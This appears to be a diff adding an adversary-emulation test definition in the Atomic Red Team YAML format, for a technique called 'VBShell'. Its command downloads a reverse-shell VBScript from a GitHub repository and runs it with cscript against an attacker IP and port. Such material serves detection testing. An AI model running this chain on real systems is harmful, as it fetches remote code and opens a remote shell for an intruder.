@@ -1,0 +1,25 @@
+attack_technique: VBShell
+display_name: 'Cscript.exe running powershell'
+atomic_tests:
+- name: Running VBShell
+  auto_generated_guid: f92a474f-abd9-491f-b338-95a101418ce3
+  description: |
+    Running cscript to execute powershell and download file from nslookup to invoke in memory and establish a connection to a remote system
+  supported_platforms:
+  - windows
+  input_arguments:
+    attacker_ip:
+      description: Ip address of the attacker system
+      type: string
+      default: 192.168.1.110
+    attacker_port:
+      description: Port used by the attacker system
+      type: integer
+      default: 2936
+  executor:
+    command: |
+      (New-Object System.Net.WebClient).DownloadFile("https://github.com/HakkYahud/Weapons/raw/main/rshell.vbs", "C:\Users\Public\rshell.vbs")
+      cscript.exe C:\Users\Public\rshell.vbs "#{attacker_ip}" "#{attacker_port}"
+    cleanup_command:
+      del C:\Users\Public\rshell.vbs >nul 2> nul
+    name: powershell
